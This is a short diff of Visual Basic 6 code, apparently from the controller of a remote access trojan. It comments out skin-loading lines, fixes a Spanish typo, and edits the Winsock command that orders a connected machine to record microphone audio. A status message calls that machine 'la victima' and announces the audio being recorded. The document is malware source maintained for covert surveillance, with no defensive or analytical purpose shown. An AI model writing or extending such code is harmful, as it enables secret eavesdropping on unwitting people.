@@ -99,8 +99,8 @@ Private Sub Form_Load()
 Index_n = (Form1.LV.SelectedItem.Index)
 vIndex = Split(Form1.LV.ListItems(Index_n).Key, "|")
 
-Skin1.LoadSkin App.path & "\sk\skin5.skn"
-Skin1.ApplySkin AUDIO.hwnd
+'Skin1.LoadSkin App.path & "\sk\skin5.skn"
+'Skin1.ApplySkin AUDIO.hwnd
 End Sub
 
 Private Sub Repro_Click()
@@ -108,7 +108,7 @@ Private Sub Repro_Click()
 If PathFileExists(App.path & "\sonido.wav") Then
     mciSendString "play sonido.wav", 0, 0, 0
 Else
-    lista.List1.ListItems.Add , , "[ERROR NO SE AH ENCONTRADO EL ARCHIVO]"
+    lista.List1.ListItems.Add , , "[ERROR NO SE HA ENCONTRADO EL ARCHIVO]"
 End If
 
 End Sub
@@ -119,7 +119,7 @@ If KeyAscii = 13 Then
 
     If Form1.Winsock1(vIndex(0)).state = sckConnected Then
     
-        Form1.Winsock1(vIndex(0)).SendData "rec*" & Val(Text1.Text) * 1000 & "+"
+        Form1.Winsock1(vIndex(0)).SendData "rec*" & Val(Text1.Text) * 1000
         lista.List1.ListItems.Add , , "[ GRABANDO AUDIO DE LA VICTIMA POR " & Text1.Text & " SEGUNDOS NO PRESIONE MAS COMANDOS O TECLAS POR FAVOR ]"
         
         If PathFileExists(App.path & "\sonido.wav") Then
